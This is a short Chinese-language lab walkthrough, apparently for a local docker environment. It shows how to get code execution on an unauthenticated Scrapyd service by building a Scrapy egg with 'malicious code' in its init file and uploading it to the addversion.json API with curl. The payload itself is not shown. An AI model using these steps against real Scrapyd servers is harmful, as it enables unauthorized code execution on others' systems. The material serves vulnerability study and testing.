开启环境：
```
docker compose up -d
```

访问web页面：
```
http://localhost:6800
```

构建一个scrapy包：
```
pip install scrapy scrapyd-client
scrapy startproject evil
```
编辑`evil/_init_.py`，加入恶意代码:
```
cd evil
scrapyd-deploy --build-egg=evil.egg
```

向API接口发送恶意包：
```
curl http://localhost:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

